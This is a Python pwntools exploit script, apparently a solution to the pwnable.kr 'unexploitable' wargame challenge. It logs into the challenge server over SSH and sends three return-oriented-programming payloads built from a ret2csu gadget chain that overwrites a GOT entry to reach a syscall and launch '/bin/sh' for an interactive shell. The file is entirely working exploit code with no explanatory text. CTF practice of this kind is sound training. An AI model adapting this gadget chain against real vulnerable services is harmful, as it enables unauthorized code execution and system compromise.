#!/usr/bin/python3
from pwn import *
context(arch = 'amd64', os = 'linux')

cmd_buffer = 0x601160
call_read = 0x40055b
syscall_addr = 0x400560
ROP__pop_rbp_ret = 0x400512

s = ssh('unexploitable', 'pwnable.kr', 2222, 'guest')
p = s.process('./unexploitable')

got_read = 0x601000

def payload_call_function(func_ptr, arg1, arg2, arg3):
    payload = pack(0x4005e6, 64)
    payload += b'\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'
    payload += pack(0, 64)          # better to be 0, we do not want to look for trouble.
    payload += pack(1, 64)          # must be 1, otherwise we can not pass 0x4005e4
    payload += pack(func_ptr, 64)
    payload += pack(arg1, 64)
    payload += pack(arg2, 64)
    payload += pack(arg3, 64)
    payload += pack(0x4005d0, 64)
    payload += b'\xcc' * 0x38
    return payload


payload0 = b'fuckfuck' + \
           b'fuckfuck' + \
           pack(cmd_buffer, 64) + \
           payload_call_function(got_read, 0, cmd_buffer - 0x8, 0x100) + \
           pack(ROP__pop_rbp_ret, 64) + \
           pack(cmd_buffer + 0x10, 64) + \
           pack(call_read, 64)

payload1 = pack(syscall_addr, 64) + \
           b'\xcc' * 0x38 + \
           pack(cmd_buffer - 0x8, 64) + \
           pack(cmd_buffer, 64) + \
           pack(0, 64) + \
           pack(0, 64) + \
           payload_call_function(cmd_buffer - 0x8, cmd_buffer, 0, 0) + \
           pack(0x400489, 64)

payload2 = b'/bin/sh\x00' + \
           b'\x00' * 8 + \
           pack(1, 64) + \
           pack(0x4005e6, 64) + \
           b'\xcc' * 8 + \
           pack(0, 64) + \
           pack(1, 64) + \
           pack(cmd_buffer - 0x8, 3 * 8)

time.sleep(4)   # DO NOT FORGET IT!!!! We should wait at least 3 second, otherwise payloads would be messed up.

p.send(payload0)
time.sleep(0.5)
p.send(payload1)
time.sleep(0.5)
p.send(payload2)
time.sleep(3)

p.interactive()
